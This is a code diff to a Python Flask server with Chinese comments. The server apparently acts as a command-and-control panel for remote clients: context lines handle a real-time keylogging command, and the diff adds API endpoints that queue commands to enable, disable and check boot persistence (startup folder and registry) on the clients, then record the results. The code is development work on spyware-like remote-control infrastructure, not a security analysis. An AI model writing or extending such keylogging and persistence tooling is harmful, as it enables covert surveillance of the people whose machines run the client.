@@ -968,6 +968,35 @@ def command_result():
                     print(f"客户端 {client_id} 实时键盘记录命令执行成功")
                 except Exception as e:
                     print(f"处理实时键盘记录命令响应错误: {str(e)}")
+            # 处理开机自启动命令结果
+            elif command_type in ["enable_auto_startup", "disable_auto_startup", "check_auto_startup"]:
+                try:
+                    # 将客户端发送的所有字段保存到结果中
+                    for key, value in data.items():
+                        if key not in ['client_id', 'command_id', 'timestamp']:
+                            result[key] = value
+                    
+                    print(f"客户端 {client_id} 开机自启动命令 {command_type} 执行完成: success={data.get('success')}")
+                    print(f"自启动状态: 启动文件夹={data.get('startup_folder')}, 注册表={data.get('registry')}, 整体={data.get('overall')}")
+                except Exception as e:
+                    print(f"处理开机自启动命令响应错误: {str(e)}")
+        
+        # 更新命令状态（对所有类型的命令）
+        if command_id in command_status:
+            command_status[command_id].update({
+                "status": "completed",
+                "success": data.get('success', False),
+                "message": data.get('message', ''),
+                "timestamp": data.get('timestamp', datetime.datetime.now().isoformat())
+            })
+            
+            # 对于开机自启动命令，保存额外的状态信息
+            if command_type in ["enable_auto_startup", "disable_auto_startup", "check_auto_startup"]:
+                for key, value in data.items():
+                    if key not in ['client_id', 'command_id', 'timestamp']:
+                        command_status[command_id][key] = value
+                        
+            print(f"已更新命令状态: {command_id} -> {command_status[command_id].get('status')}")
         
         if not command_found:
             print(f"警告: 未找到对应的命令 {command_id}，但已处理结果数据")
@@ -4488,3 +4517,186 @@ def send_command_to_client(client_id):
         import traceback
         traceback.print_exc()
         return jsonify({"status": "error", "message": f"发送命令错误: {str(e)}"}), 500
+
+# 开机自启动管理API
+@app.route('/api/auto_startup/<client_id>/enable', methods=['POST'])
+def enable_auto_startup(client_id):
+    """开启指定客户端的开机自启动"""
+    try:
+        # 检查客户端是否存在
+        clients = get_all_clients()
+        if client_id not in clients:
+            return jsonify({"status": "error", "message": "客户端不存在"}), 404
+            
+        # 生成命令ID
+        command_id = generate_command_id()
+        
+        # 构建开启自启动命令
+        command = {
+            "id": command_id,
+            "type": "enable_auto_startup",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        # 添加命令到队列
+        if client_id not in client_commands:
+            client_commands[client_id] = []
+        client_commands[client_id].append(command)
+        
+        # 添加命令状态
+        command_status[command_id] = {
+            "client_id": client_id,
+            "command": command,
+            "status": "pending",
+            "message": "开启开机自启动命令已发送",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        return jsonify({
+            "status": "success",
+            "message": "开启开机自启动命令已发送",
+            "command_id": command_id
+        })
+    except Exception as e:
+        print(f"开启开机自启动错误: {str(e)}")
+        return jsonify({"status": "error", "message": f"开启开机自启动错误: {str(e)}"}), 500
+
+@app.route('/api/auto_startup/<client_id>/disable', methods=['POST'])
+def disable_auto_startup(client_id):
+    """关闭指定客户端的开机自启动"""
+    try:
+        # 检查客户端是否存在
+        clients = get_all_clients()
+        if client_id not in clients:
+            return jsonify({"status": "error", "message": "客户端不存在"}), 404
+            
+        # 生成命令ID
+        command_id = generate_command_id()
+        
+        # 构建关闭自启动命令
+        command = {
+            "id": command_id,
+            "type": "disable_auto_startup",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        # 添加命令到队列
+        if client_id not in client_commands:
+            client_commands[client_id] = []
+        client_commands[client_id].append(command)
+        
+        # 添加命令状态
+        command_status[command_id] = {
+            "client_id": client_id,
+            "command": command,
+            "status": "pending",
+            "message": "关闭开机自启动命令已发送",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        return jsonify({
+            "status": "success",
+            "message": "关闭开机自启动命令已发送",
+            "command_id": command_id
+        })
+    except Exception as e:
+        print(f"关闭开机自启动错误: {str(e)}")
+        return jsonify({"status": "error", "message": f"关闭开机自启动错误: {str(e)}"}), 500
+
+@app.route('/api/auto_startup/<client_id>/status', methods=['GET'])
+def get_auto_startup_status(client_id):
+    """检查指定客户端的开机自启动状态"""
+    try:
+        # 检查客户端是否存在
+        clients = get_all_clients()
+        if client_id not in clients:
+            return jsonify({"status": "error", "message": "客户端不存在"}), 404
+            
+        # 生成命令ID
+        command_id = generate_command_id()
+        
+        # 构建检查状态命令
+        command = {
+            "id": command_id,
+            "type": "check_auto_startup",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        # 添加命令到队列
+        if client_id not in client_commands:
+            client_commands[client_id] = []
+        client_commands[client_id].append(command)
+        
+        # 添加命令状态
+        command_status[command_id] = {
+            "client_id": client_id,
+            "command": command,
+            "status": "pending",
+            "message": "检查开机自启动状态命令已发送",
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        return jsonify({
+            "status": "success",
+            "message": "检查开机自启动状态命令已发送",
+            "command_id": command_id
+        })
+    except Exception as e:
+        print(f"检查开机自启动状态错误: {str(e)}")
+        return jsonify({"status": "error", "message": f"检查开机自启动状态错误: {str(e)}"}), 500
+
+@app.route('/api/auto_startup/command/<command_id>/status', methods=['GET'])
+def get_auto_startup_command_status(command_id):
+    """获取开机自启动命令的执行状态"""
+    try:
+        if command_id not in command_status:
+            return jsonify({"status": "error", "message": "命令不存在"}), 404
+            
+        cmd_status = command_status[command_id]
+        status = cmd_status.get("status", "pending")
+        
+        if status == "completed":
+            # 从命令结果中获取详细信息
+            success = cmd_status.get("success", False)
+            message = cmd_status.get("message", "")
+            
+            # 构建开机自启动状态信息
+            startup_info = None
+            
+            # 检查是否有自启动状态字段
+            if any(key in cmd_status for key in ["startup_folder", "registry", "overall", "status_text"]):
+                startup_info = {
+                    "startup_folder": cmd_status.get("startup_folder", False),
+                    "registry": cmd_status.get("registry", False),
+                    "overall": cmd_status.get("overall", False),
+                    "status_text": cmd_status.get("status_text", "")
+                }
+                
+                # 如果有status_text，使用它作为主要消息
+                if cmd_status.get("status_text"):
+                    message = cmd_status.get("status_text")
+            
+            # 如果message本身是字典，也尝试解析
+            elif isinstance(message, dict):
+                startup_info = message
+                message = message.get("status_text", str(message))
+            
+            print(f"返回开机自启动状态: command_id={command_id}, startup_info={startup_info}")
+            
+            return jsonify({
+                "status": "success",
+                "command_status": "completed",
+                "success": success,
+                "message": message,
+                "startup_info": startup_info
+            })
+        else:
+            return jsonify({
+                "status": "success",
+                "command_status": status,
+                "message": cmd_status.get("message", "等待执行"),
+                "command_id": command_id
+            })
+    except Exception as e:
+        print(f"获取开机自启动命令状态错误: {str(e)}")
+        return jsonify({"status": "error", "message": f"获取命令状态失败: {str(e)}"}), 500
